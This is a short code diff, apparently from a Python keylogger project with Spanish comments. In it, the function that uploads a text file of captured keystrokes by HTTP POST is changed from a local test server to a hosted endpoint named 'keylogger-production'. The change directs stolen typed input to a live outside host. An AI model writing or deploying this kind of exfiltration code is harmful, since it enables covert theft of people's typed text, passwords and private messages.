@@ -66,7 +66,7 @@ def save_word(): #Crea un txt y va guardando palabras cada que se presione espac
     
 
 def send_server(filename): #Envía el txt al servidor con un POST
-    url = "http://127.0.0.1:5000/upload"
+    url = "https://keylogger-production.up.railway.app/upload"
     with open(filename, "rb") as file:
         try:
             response = requests.post(url, files={"file": file})
